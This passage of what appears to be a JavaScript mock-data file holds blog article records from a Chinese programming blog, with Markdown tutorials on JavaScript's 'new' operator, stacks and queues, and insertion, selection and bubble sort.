            updatedAt: '2021-03-01T16:20:36.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 16,
          name: 'Promise',
          color: 'rgba(154, 32, 206, 0.5)',
          createdAt: '2020-07-21T07:32:42.000Z',
          updatedAt: '2020-07-21T07:32:42.000Z',
        },
      ],
    },
    {
      id: 67,
      title: '搞清楚 js new',
      is_comment: 1,
      status: 1,
      img: '/1614578243862new封面图.png',
      content:
        "# new 构造函数里的this以及返回值\n\n```js\n/**\n * new 构造函数里面的this\n * 默认函数里面的this，谁调用就指向谁，\n * 但是new 构造函数，这个构造函数里面的this指向是new 构造函数出来的实例\n * 如果new 构造函数里面有返回值:\n * 1，如果返回的是一个基本数据类型（string,number,undefined...）,则返回值为new 构造函数出来的实例\n * 2，如果返回的是一个非基本数据类型的对象（object），则返回值为指定的对象\n * 如果new 构造函数里面没有返回值，默认返回undefined，则返回值还是new 构造函数出来的实例\n*/\nconsole.log('---------new 构造函数里的this以及返回值-----------');\nfunction Test(name) {\n    this.name = name\n}\nvar test = new Test('test')\nconsole.log(test);  //Test {name: \"test\"}\n\nfunction Test1(name) {\n    this.name = name\n    return 1\n}\nvar test1 = new Test1('test1')\nconsole.log(test1); //Test1 {name: \"test1\"}\n\nfunction Test2(name) {\n    this.name = name\n    return { age: 18 }\n}\nvar test2 = new Test2('test2')\nconsole.log(test2); //{age: 18}\n```\n\n![构造函数this和返回值.png](https://img.cdn.hsslive.cn/1614578216948构造函数this和返回值.png)\n\n# 没有new得到的是什么\n\n```js\n/**\n * 首先我们看没有new的时候，得到的是什么\n * 根据控制台打印，可知没有new的时候，得到的dog只有自身的name属性，以及__proto__\n * 而没有new的__proto__，指向的就是Object.prototype\n*/\nconsole.log('-------没有new得到的是什么--------');\nvar dog = { name: 'husky' }\nconsole.log(dog);\n```\n\n![没有new得到什么.png](https://img.cdn.hsslive.cn/1614578227311没有new得到什么.png)\n\n# new做了什么\n\n```js\n/**\n * new做了什么?\n * 首先我们要知道new之后的是什么，\n * 根据控制台打印，可知new之后，cat除了有自身的name属性，还有__proto__\n * 而__proto__指向的并不是默认的Object.prototype，而是构造函数的prototype，\n * 因为：cat自身的__proto__有以下：\n * cat的__proto__有constructor指向Cat，\n * cat的__proto__还有一个__proto__，指向Object.prototype\n * 因此可以得出结论：\n * cat的__proto__指向Cat.prototype\n * */\nconsole.log('--------new做了什么---------');\nfunction Cat(name) {\n    this.name = name\n}\nvar cat = new Cat('tom')\nconsole.log(cat);\n\nfunction _new(arg1) {\n    var obj = {} //新建一个对象\n    // arg1是传进来的构造函数\n    obj.__proto__ = arg1.prototype\n    var args = [].slice.call(arguments)\n    // args.length = args.length - 1    //bug，这是删除最后一个元素，并不是删除第一个元素\n    args.splice(0, 1)   //删除第一个构造函数\n    // 修改构造函数的this，并将参数传给它，然后执行该构造函数\n    arg1.apply(obj, args)\n    return obj  //返回新建的对象\n}\nvar cat1 = _new(Cat, 'tom1')\nconsole.log(cat1);\n```\n\n![new做了什么.png](https://img.cdn.hsslive.cn/1614578236666new做了什么.png)\n\n# 简化版实现new\n\n```js\n/**\n * new做了什么?\n * 创建一个空对象，且该对象继承构造函数的原型。\n * 将构造函数里的this指向构造函数的实例\n * 最后返回这个空对象（如果没有手动返回其他的对象）\n * */\n\nconsole.log('-------简化版实现new---------');\nvar Parent = function (name, age) {\n    this.name = name;\n    this.age = age;\n};\n\n// 实现new\nfunction myNew() {\n    var obj = {}\n    var args = [].slice.call(arguments)\n    var constructor = args.shift()\n    obj.__proto__ = constructor.prototype\n    constructor.apply(obj, args)\n    return obj\n}\n\nvar p = new Parent('hss', 21)\nvar p1 = myNew(Parent, 'hss', 21)\nconsole.log(p);\nconsole.log(p1);\n```\n\n",
      click: 51,
      createdAt: '2021-03-01T05:57:24.000Z',
      updatedAt: '2021-03-01T05:57:24.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 67,
            article_id: 67,
            type_id: 1,
            createdAt: '2021-03-01T05:57:24.000Z',
            updatedAt: '2021-03-01T05:57:24.000Z',
          },
        },
      ],
      stars: [
        {
          id: 1,
          article_id: 67,
          comment_id: -1,
          from_user_id: 12,
          to_user_id: -1,
          createdAt: '2021-03-01T06:34:09.000Z',
          updatedAt: '2021-03-01T06:34:09.000Z',
        },
      ],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 67,
            user_id: 1,
            article_id: 67,
            createdAt: '2021-03-01T05:57:25.000Z',
            updatedAt: '2021-03-01T05:57:25.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 66,
      title: '栈和队列',
      is_comment: 1,
      status: 1,
      img: '/1613721531737栈和队列.png',
      content:
        "# 栈(Stack)\n\n> 栈（stack）又名堆栈，它是一种运算受限的线性表。限定仅在表尾进行插入和删除操作的线性表\n\n## 特点\n\n> 后进先出（LIFO即Last in First out），把栈比喻薯片桶，一开始薯片桶的空的，第一片放进去的薯片会在最底部，第二片薯片会在顶部，想要吃掉第一片薯片，就得先把第二片薯片从薯片桶里拿出来or吃掉，然后再拿第一片薯片，也就是最先进去的薯片要到最后才被吃掉。\n\n## 常用方法\n\n> 新建一个栈类\n\n```js\nfunction Stack() {\n    this.items = []\n}\n```\n\n### 插入元素(压栈)\n\n```js\n// 往栈插入一个元素（压栈）\nStack.prototype.push = function (element) {\n    this.items.push(element)\n}\n```\n\n### 删除元素(出栈)\n\n```js\n// 删除并返回栈顶元素（出栈）\nStack.prototype.pop = function (element) {\n    return this.items.pop()\n}\n```\n\n### 返回栈顶元素\n\n```js\n// 返回栈顶元素\nStack.prototype.peek = function (element) {\n    return this.items[this.items.length - 1]\n}\n```\n\n### 清空栈\n\n```js\n// 清空栈\nStack.prototype.clear = function (element) {\n    this.items = []\n}\n```\n\n### 打印栈\n\n```js\n// 打印栈\nStack.prototype.print = function (element) {\n    console.log(this.items.toString());\n}\n```\n\n### 栈大小\n\n```js\n// 判断栈大小 \nStack.prototype.size = function (element) {\n    return this.items.length\n}\n```\n\n### 栈是否为空\n\n```js\n// 判断栈是否为空\nStack.prototype.isEmpty = function (element) {\n    return this.items.length == 0\n}\n```\n\n## 案例\n\n### 十进制转二进制\n\n> 采用余数法，和2取余，把得到的结果进行逆序就是转换结果。比如十进制的10转换为二进制，\n>\n> 第一次：10除以2得5余0\n>\n> 第二次：5除以2得2余1\n>\n> 第三次：2除以2得1余0\n>\n> 第四次：1除以2得0余1\n>\n> 将得到的结果进行逆序，所以十进制的10转换为二进制是1010\n\n### 栈实现\n\n> 进制转换的实现可以比喻成栈，最后计算的结果最先输出，最先计算的结果最后输出（栈也是后进先出）\n\n```js\n// 进制转换(栈实现)\nfunction transform(num) {\n    var stack = new Stack()\n    var str = \"\"\n    while (num > 0) {\n        var yushu = num % 2 //余数\n        stack.push(yushu)\t//入栈\n        num = Math.floor(num / 2) //每次取余的结果\n    }\n    while (!stack.isEmpty()) {\n        str += stack.pop() + \"\"\t//出栈\n    }\n    return str\n}\nconsole.log(transform(10))\t//1010\n```\n\n\n\n# 队列(Queue)\n\n> 队列是一种先进先出（First in First Out）的线性表，简称FIFO。允许插入的一端称为队尾，允许删除的一端称为队头。\n\n## 特点\n\n> 先进先出（First in First Out），可以把队列比喻成公交车站前面的排队，排队的人们可以看做队列，先排队的人先上车\n\n## 常用方法\n\n```js\nfunction Queue() {\n    this.item = []\n}\n\n// 入列\nQueue.prototype.enqueue = function (ele) {\n    this.item.push(ele)\n}\n\n// 出列\nQueue.prototype.dequeue = function () {\n    return this.item.shift()\n}\n\n// 查看队列头\nQueue.prototype.front = function () {\n    return this.item[0]\n}\n\n// 检查队列是否为空\nQueue.prototype.isEmpty = function () {\n    return this.item.length == 0\n}\n\n// 检查队列大小\nQueue.prototype.size = function () {\n    return this.item.length\n}\n```\n\n## 案例\n\n### 击鼓传花\n\n### 队列实现\n\n```js\n// 击鼓传花，给定一个数比如3，一个花，一群人坐在一圈里，一个人拿花喊1，\n// 然后把花传给第二个人喊2，第二个人再把花传给第三个人，第三个人喊3并淘汰，\n// 继续把花传给下一个人，继续数，继续淘汰，最后一个人是赢家\n// 要求，给定一个数和一群人，返回赢家\nfunction game(num, list) {\n    var queue = new Queue()\n    for (var i = 0; i < list.length; i++) {\n        queue.enqueue(list[i])\n    }\n    var y = 1\n    while (queue.size() > 1) { //如果当前队列人数大于1\n        // 手里有花的且喊的不是num的人往队列最后移\n        for (var j = 0; j < num - 1; j++) {\n            queue.enqueue(queue.dequeue())\n        }\n        var taotai = queue.dequeue() //花到手且喊num的人里就淘汰\n        console.log('第' + y + '轮淘汰了:', taotai)\n        y++\n    }\n    return queue.dequeue()\n}\n//赢家是： a\nconsole.log('赢家是：', game(3, ['a', 'b', 'c', 'd', 'e', 'f']))\n```\n\n## 优先级队列\n\n> 普通的队列是一种先进先出（First in First Out）的数据结构，元素在队列尾追加，而从队列头删除。在优先队列中，元素被赋予优先级。当访问元素时，具有最高优先级的元素最先删除。优先队列具有最高级先出 （first in, largest out）的行为特征\n\n### 实现\n\n```js\n// 优先级队列\nfunction FirstQueue() {\n    this.item = []\n}\nFirstQueue.prototype.enqueue = function (ele, level) {\n    function QueueItem(ele, level) {\n        this.ele = ele\n        this.level = level\n    }\n    var quequItem = new QueueItem(ele, level)\n    var isMin = true\n    for (var i = 0; i < this.item.length; i++) {\n        if (this.item[i].level < quequItem.level) {\n            this.item.splice(i, 0, quequItem)\n            isMin = false\n            break\n        }\n    }\n    if (isMin) {\n        this.item.push(quequItem)\n    }\n}\nvar firstQueue = new FirstQueue()\nconsole.log(firstQueue)\nconsole.log(firstQueue.enqueue('存10', 1))\nconsole.log(firstQueue.enqueue('存300', 3))\nconsole.log(firstQueue.enqueue('存100000', 10))\nconsole.log(firstQueue.enqueue('存200', 2))\nconsole.log(firstQueue)\n```\n\n",
      click: 79,
      createdAt: '2021-02-19T07:58:54.000Z',
      updatedAt: '2021-02-19T08:07:40.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 66,
            article_id: 66,
            type_id: 3,
            createdAt: '2021-02-19T07:58:54.000Z',
            updatedAt: '2021-02-19T07:58:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 66,
            user_id: 1,
            article_id: 66,
            createdAt: '2021-02-19T07:58:54.000Z',
            updatedAt: '2021-02-19T07:58:54.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 65,
      title: '插入排序',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 插入排序\n\n> 核心思想：局部有序，可以和选择排序进行比较，选择排序是每次都找所有值的最值，\n\n## 基本原理\n\n> 从小到大排序\n\n> 1. 从第一个元素开始，假定他是已排序的\n> 2. 取出他的下一个元素(假设他叫a)，和前面已经排序的对比，\n> 3. 如果前面已经排序好的元素(假如他叫b)大于a，则排序好的元素(b)往后移\n> 4. 重复3，直到找到已排序的元素小于或者等于a的位置\n> 5. 将a插入到改位置\n> 6. 重复上述步骤\n\n## 复杂度\n\n## 稳定性\n\n> 如何判断稳定性？个人总结：\n>\n> 有若干元素，其中A元素和B元素相等，并且A元素在B元素前面，如果使用某种排序算法排序后，能够保证A元素依然在B元素的前面，可以说这个该算法是稳定的。\n\n> 插入排序核心：取一个元素，拿这个元素和排序好的元素对比，如果排序好的元素比取出来的元素大/小，则把排序好的元素往后移，即只要往后移了，取出来的元素的位置就一定会改变，正因为如此，假设只有两个元素，且这两个元素相等(只有两个那也代表他们必相邻)，后一个和前一个对比，第一个不大/小于取出来对比的第二个，因此第一个不会往后移(也就是说第一个不会移到第二个的位置)，也就是说第一个还是原本的第一个，第二个也还是原本的第二个，他们的相对位置没有变(第一个还是在第二个的左边，第二个还是在第一个的右边)，所以插入排序是稳定的。\n\n\n\n> 其实知道基本原理以及**代码实现**的话，就更好判断稳定性了。例子：[1,1]\n>\n> 下标1和下标0的值比较，下标值1等于下标值0，两个值相等，不走while循环，直接arr[1] =arr[1]，即原来下标的值还是1，即它是稳定性算法\n>\n> ```js\n> function insertSort(arr) {\n>     for (var i = 1; i < arr.length; i++) {\n>         var j = i\n>         var temp = arr[i]\n>         while (arr[j - 1] > temp && j > 0) {\n>             arr[j] = arr[j - 1]\n>             j--\n>         }\n>         arr[j] = temp\n>     }\n>     return arr\n> }\n> ```\n\n## 实现\n\n### 从小到大\n\n```js\n// var arr = [1, 2, 3, 4, 5, 6];\n// var arr = [6, 5, 4, 3, 2, 1];\nvar arr = [32, 14, 6, 9, 20, 58];\n\n/**\n * 核心：取一个值（a）出来，依次和前面已排序好的值作比较，\n * 如果前面排序好的值比a大，则将该值往后移，\n * 直到找到值等于或小于a的位置，将a插入该位置，\n * 继续重复上述步骤\n */\n\n\n/**\n * 原始顺序：                                   32,14,6,9,20,58\n * 选出下标为1的值和前面已经排序的1个作对比，排序后[14,32],6,9,20,58；比较了1次后换位置\n * 选出下标为2的值和前面已经排序的2个作对比，排序后[6,14,32],9,20,58；比较了2次后换位置\n * 选出下标为3的值和前面已经排序的3个作对比，排序后[6,9,14,32],20,58；比较了3次后换位置\n * 选出下标为4的值和前面已经排序的4个作对比，排序后[6,9,14,20,32],58；比较了2次后换位置\n * 选出下标为5的值和前面已经排序的5个作对比，排序后[6,9,14,20,32,58]；比较了0次后换位置\n */\n\n// 假设当i=2，即j=2，\n// 判断while循环，arr[i-1]值是14，arr[j]是6，arr[i-1]大于arr[j]，\n// 即前面的元素对比的元素大，进入while循环\n// 将对比的元素即arr[i-1]，往后移，即arr[i-1] =arr[j]，即arr[i-1]是arr[1]是6，\n// 后移后，说明目前拿出的值还是最小值，还要继续和之前的元素对比，\n// 先j--，这样下个while就可以继续和之前的元素对比\n// 继续while循环，此时j=1，i还是2，arr[i-1]即arr[1]是6，\n// arr[j]即arr[1]是14\n// arr[i-1]为14，大于arr[i]\nfunction insertSort(arr) {\n    for (var i = 1; i < arr.length; i++) {\n        // console.log(1)\n        // console.log(i)\n        var j = i           //保存当前取出来的元素下标\n        var temp = arr[i]   //保存取出来的元素\n        while (arr[j - 1] > temp && j > 0) {\n            console.log(1)\n            // 取出来的元素和前面的元素比较，如果前面的元素大于取出来的元素\n            // 则前面的元素往后移，即把该元素(arr[j-1])移到arr[j]\n            // 即arr[j]的值变成了arr[j-1]，即arr[j] = arr[j-1]\n            arr[j] = arr[j - 1]\n\n            // 下面代码是错误的!\n            // arr[j-1] = arr[j]，是直接把取出来的值放到上一个位置了\n            // arr[j-1] = arr[j]\n            j--\n        }\n        // 将取出来的值放到while循环后的j位置。\n        arr[j] = temp\n    }\n    return arr\n}\n```\n\n### 从大到小\n\n```js\nfunction insertSort1(arr) {\n    for (var i = 1; i < arr.length; i++) {\n        var j = i \n        var temp = arr[i]\n        while (arr[j - 1] < temp && j > 0) {\n            console.log(1)\n            // 取出来的元素和前面的元素比较，如果前面的元素小于取出来的元素\n            // 则前面的元素往后移，即把该元素(arr[j-1])移到arr[j]\n            // 即arr[j]的值变成了arr[j-1]，即arr[j] = arr[j-1]\n            arr[j] = arr[j - 1]\n\n            j--\n        }\n        // 将取出来的值放到while循环后的j位置。\n        arr[j] = temp\n    }\n    return arr\n}\n\n```\n\n',
      click: 50,
      createdAt: '2021-02-18T19:31:49.000Z',
      updatedAt: '2021-02-18T19:31:49.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 65,
            article_id: 65,
            type_id: 3,
            createdAt: '2021-02-18T19:31:49.000Z',
            updatedAt: '2021-02-18T19:31:49.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 65,
            user_id: 1,
            article_id: 65,
            createdAt: '2021-02-18T19:31:49.000Z',
            updatedAt: '2021-02-18T19:31:49.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 64,
      title: '选择排序',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 选择排序\n\n> 选择排序是冒泡排序的升级版\n\n## 基本原理\n\n> 每次排序(互换位置)前，先从没排序的数列里面选出最小值，然后再把选中的最小值和目标值交换位置\n\n比如，第一次排序，所有元素(n)都是未排序的，就在所有元素里选出最小值，然后将这个最小值和第一个位置互换，然后第二次在剩余的元素(n-1)里先选出最小值（也就是全部元素(n)的第二小值），然后把最小值和第而个值互换位置，......以此类推，知道找到第n-1个元素和n互换位置后，第n个位置不用比较了，因为他就是最大值。\n\n## 复杂度\n\n> 最好复杂度O(n²)\n>\n> 最差复杂度O(n²)\n>\n> 因为选择排序是每次先找出一个最值，然后再进行互换位置，虽然比较次数还是O(n²)，但是交换次数由O(n²)减到O(n)\n\n## 稳定性\n\n> 稳定算法，所有相同元素相对位置都不变\n>\n> 不稳定算法，只要有一个相同元素的相对位置变了，他就是不稳定的\n\n> 举个应用的例子： ABCDE排队办事，然后每个人办事所用时长对应上面表里面的数字，也就是：A5,B8,C5,D2,E9； 这时候为了减少办事整体时间，就优先从用时最短的开始办起，于是乎排个序； 如果是稳定排序，则应该是：D2,A5,C5,B8,E9，合情合理、相安无事； 如果是不稳定的，就如上面提到的选择排序，那排序结果就变成：D2,C5,A5,B8,E9，很显然排序之后本应该在A后面的C跑到前面去了，如果这是现实排队的话，说不定两人就排队的先来后到原则发生争执，开始真人PK了。\n\n> 选择排序，如果当前元素(a)比一个对比的元素(b)小，而该对比的元素(b)又出现在一个和当前元素(a)相等的元素后面，那么交换后稳定性就被破坏了。\n>\n> 举个的例子：从小到大排列，[3(0),3(1),1(2)]，第一次，第一个3回合最后的2互换位置，则结果：[1(2),3(1),3(0)]，**此时已经原序列的两个3顺序就被破坏了**\n>\n> 然后第二次，下标为1的3和自己交换位置\n>\n> 最后第三次，下标为2的3和自己交换位置\n>\n> 最终原始的两个3的顺序变了（即现在两个相同的三下标值是1,0），即不稳定（如果是稳定的话，则结果应该是[1(2),3(0),3(1)]）\n\n```js\nfunction selectionSort(arr) {\n    for (var j = 0; j < arr.length; j++) {\n        var min = j //记录最小值的下标\n        for (var i = min + 1; i < arr.length; i++) {\n            if (arr[min] > arr[i]) {\n                min = i\n            }\n        }\n        var temp = arr[j]\n        arr[j] = arr[min]\n        arr[min] = temp\n    }\n    return arr\n}\n```\n\n\n\n## 实现\n\n### 从大到小\n\n```js\nvar arr = [32, 14, 6, 9, 20, 58];\n// var arr = [3, 3, 1, 1]\n\n// 循环次数：(arr.length*arr.length-1)/2\n// arr.length-1+arr.length-2+arr.length-3...\n// 5+4+3+2+1\n// 第一轮内层循环arr.length - 1 - 0次，即5次\n// 第二轮内层循环arr.length - 1 - 1次，即4次\n// 第三轮内层循环arr.length - 1 - 2次，即3次\n// 第四轮内层循环arr.length - 1 - 3次，即2次\n// 第五轮内层循环arr.length - 1 - 5次，即1次\n// 第六轮内层循环arr.length - 1 - 6次，即0次\nfunction selectionSort(arr) {\n    for (var j = 0; j < arr.length; j++) {\n        // 记录最小值的下标（且每次外层for循环重新修改查找范围(越来越小)）\n        // 外层j=0，从j+1至到arr.length找最小值\n        // 外层j=1，从j+2至到arr.length找最小值\n        // ......\n        var min = j\n\n        // 内层循环，每次内层循环都找出最小值的下标\n        // var i = min+1用处是每次都不和自己比较，\n        // 比如第一次外循环j=0,min也等于0,如果var i=min，即arr[0] == arr[0],没必要比较\n        // 比如第二次外循环j=1,min也等于1如果var i=min，即arr[1] == arr[1],没必要比较\n        for (var i = min + 1; i < arr.length; i++) {\n            console.log(1)\n            // console.log(min, i)\n            // 如果找到的值比最小值还小，则把min改成找到的值的下标\n            if (arr[min] > arr[i]) {\n                min = i\n            }\n        }\n        // 将选择的j值和找到的最小值互换位置\n        var temp = arr[j]\n        arr[j] = arr[min]\n        arr[min] = temp\n    }\n    return arr\n}\n\n```\n\n### 从小到大\n\n```js\nfunction selectionSort1(arr) {\n    for (var j = 0; j < arr.length; j++) {\n        var max = j\n        for (var i = max + 1; i < arr.length; i++) {\n            console.log(1)\n            if (arr[max] < arr[i]) {\n                max = i\n            }\n        }\n        var temp = arr[j]\n        arr[j] = arr[max]\n        arr[max] = temp\n    }\n    return arr\n}\n```\n\n# 冒泡排序\n\n> 点这里：[冒泡排序](https://www.zhengbeining.com/article/63)\n\n# 插入排序\n\n> 点这里：[插入排序](https://www.zhengbeining.com/article/65)',
      click: 31,
      createdAt: '2021-02-18T11:00:19.000Z',
      updatedAt: '2021-02-18T19:33:38.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 64,
            article_id: 64,
            type_id: 3,
            createdAt: '2021-02-18T11:00:19.000Z',
            updatedAt: '2021-02-18T11:00:19.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 64,
            user_id: 1,
            article_id: 64,
            createdAt: '2021-02-18T11:00:19.000Z',
            updatedAt: '2021-02-18T11:00:19.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 22,
          name: '数据结构和算法',
          color: '#4eb1d0',
          createdAt: '2021-02-17T16:41:57.000Z',
          updatedAt: '2021-02-17T16:41:59.000Z',
        },
      ],
    },
    {
      id: 63,
      title: '冒泡排序，两种实现以及优化',
      is_comment: 1,
      status: 1,
      img: '/1613635230757maopaopaixu.png',
      content:
        '# 冒泡排序\n\n## 基本原理\n\n> 比较相邻的元素。如果第一个比第二个大，就交换他们两个。\n\n 比如：第一次排序，内层循环两两对比互换位置，将一个最值放到最后，第二次排序，内层循环又继续通过两两对比互换位置，将剩下的值中的最值放到倒数第二个位置，因为互换位置是通过两两对比的方式，所以交换次数的时间复杂度是O(n²)\n\n## 稳定性\n\n> 冒泡排序就是把小的元素往前调或者把大的元素往后调。比较是相邻的两个元素比较，交换也发生在这两个元素之间。所以，如果两个元素相等，是不会再交换的如果两个相等的元素没有相邻，那么即使通过前面的两两交换把两个相邻起来，这时候也还是不会交换，所以相同元素的前后顺序并没有改变，所以冒泡排序是一种稳定排序算法。\n>\n> 总结：冒泡排序是相邻元素两两对比，交换也发生在这两个元素之间。只有两个元素大小不一样才会交换，相邻的相同元素大小一样不会交换位置，相同的元素不相邻，后面通过两两对比交换变成了相邻了，也还是大小一样，不会交换位置！！！假设只有两个元素，且这两个元素相等(只有两个那也代表他们必相邻)，他们两两对比，左边的不大/小于右边的，因此不会交换位置！所以冒泡排序是稳定的。\n\n> 举例子，看代码最直接，假设两个相同元素:[1,1]，arr[j] < arr[j + 1]压根就不会成立，因此这两个相同元素不会互换位置，故稳定\n>\n> ```js\n> function bubbleSort(arr) {\n>     for (var i = 0; i < arr.length; i++) {\n>         for (var j = 0; j < arr.length; j++) {\n>             if (arr[j] < arr[j + 1]) {\n>                 var temp = arr[j]\n>                 arr[j] = arr[j + 1]\n>                 arr[j + 1] = temp\n>             }\n>         }\n>     }\n>     return arr\n> }\n> ```\n\n## 复杂度\n\n> 时间复杂度：O(n²)\n\n## 实现\n\n### 实现1\n\n```js\nvar arr = [1, 2, 3, 4, 5, 6];\n// var arr = [6, 5, 4, 3, 2, 1];\n// var arr = [32, 14, 6, 9, 20, 58];\n\n// 外层for循环控制互换多少轮\n// 里层for循环控制每一轮互换多少次\n// 没有任何优化，需要固定循环arr.length*arr.length次数\nfunction bubbleSort(arr) {\n    // 外层for循环互换6轮\n    for (var i = 0; i < arr.length; i++) {\n        // 内层for循环每轮互换6次\n        for (var j = 0; j < arr.length; j++) {\n            console.log(1)\n            // 如果第一个比第二个大，则交换位置，最终就是：小->大\n            // if (arr[j] >arr[j + 1]) {\n            // 如果第一个比第二个小，则互换位置，最终就是：大->小\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n```\n\n#### 优化1\n\n```js\n// 优化越界问题\n// 因为里层for循环会下标+1，当里层j=arr.length+1时，值为undefined\n// 优化后，需要固定循环arr.length*(arr.length-1)次数\nfunction bubbleSort1(arr) {\n    for (var i = 0; i < arr.length; i++) {\n        for (var j = 0; j < arr.length - 1; j++) {\n            console.log(1)\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n```\n\n#### 优化2\n\n```js\n/**\n * 每次外层循环后，里层循环不应该固定循环arr.length-1次，\n * 因为每次外层循环后，里层循环都会得出一个最终的最值，\n * 后面的里层循环，这个最值不用重复的继续循环\n * 所以应该每次都相对应的减少里层的循环次数\n * 第一轮内循环互换了5次，第二轮4次，第三轮3次，第四轮2次，第五轮1次，第六轮0次\n * 优化后，需要固定循环(arr.length*(arr.length-1))/2次数\n */\nfunction bubbleSort2(arr) {\n    for (var i = 0; i < arr.length; i++) {\n        // console.log(i)\n        // 互换过的下次就不互换，即每次内层循环次数随着外层越来越小\n        // 第一轮内层循环互换arr.length - 1 - 0次，即5次\n        // 第二轮内层循环互换arr.length - 1 - 1次，即4次\n        // 第三轮内层循环互换arr.length - 1 - 2次，即3次\n        // 第四轮内层循环互换arr.length - 1 - 3次，即2次\n        // 第五轮内层循环互换arr.length - 1 - 5次，即1次\n        // 第六轮内层循环互换arr.length - 1 - 6次，即0次\n        for (var j = 0; j < arr.length - 1 - i; j++) {\n            console.log(1)\n            // console.log(i, j)\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n\n/**\n * 0 0\n * 0 1\n * 0 2\n * 0 3\n * 0 4\n * 1 0\n * 1 1\n * 1 2\n * 1 3\n * 2 0\n * 2 1\n * 2 2\n * 3 0\n * 3 1\n * 4 0\n */\n```\n\n### 实现2\n\n```js\n/**\n * 前面是从第一个到最后一个往后冒泡\n * 也可以从最后一个到第一个往前冒泡\n * 需要固定循环(arr.length)*(arr.length)次数\n */\nfunction bubbleSort3(arr) {\n    for (var i = arr.length - 1; i >= 0; i--) {\n        for (var j = 0; j < arr.length; j++) {\n            console.log(1)\n            // console.log(i,j)\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n```\n\n#### 优化1\n\n```js\n// 优化里层越界问题\n// 需要固定循环(arr.length)*(arr.length-1)次数\nfunction bubbleSort4(arr) {\n    for (var i = arr.length - 1; i >= 0; i--) {\n        for (var j = 0; j < arr.length - 1; j++) {\n            console.log(1)\n            // console.log(i,j)\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n```\n\n#### 优化2\n\n```js\n// 优化里层循环\n// 需要固定循环((arr.length)*(arr.length))/2次数\nfunction bubbleSort5(arr) {\n    for (var i = arr.length - 1; i >= 0; i--) {\n        // 互换过的下次就不互换，即每次内层循环次数随着外层越来越小\n        // 第一轮内层循环互换arr.length - 1 - 0次，即5次\n        // 第二轮内层循环互换arr.length - 1 - 1次，即4次\n        // 第三轮内层循环互换arr.length - 1 - 2次，即3次\n        // 第四轮内层循环互换arr.length - 1 - 3次，即2次\n        // 第五轮内层循环互换arr.length - 1 - 5次，即1次\n        // 第六轮内层循环互换arr.length - 1 - 6次，即0次\n        for (var j = 0; j < i; j++) {\n            // console.log(1)\n            console.log(i, j)\n            if (arr[j] < arr[j + 1]) {\n                var temp = arr[j]\n                arr[j] = arr[j + 1]\n                arr[j + 1] = temp\n            }\n        }\n    }\n    return arr\n}\n/**\n * 5 0\n * 5 1\n * 5 2\n * 5 3\n * 5 4\n * 4 0\n * 4 1\n * 4 2\n * 4 3\n * 3 0\n * 3 1\n * 3 2\n * 2 0\n * 2 1\n * 1 0\n 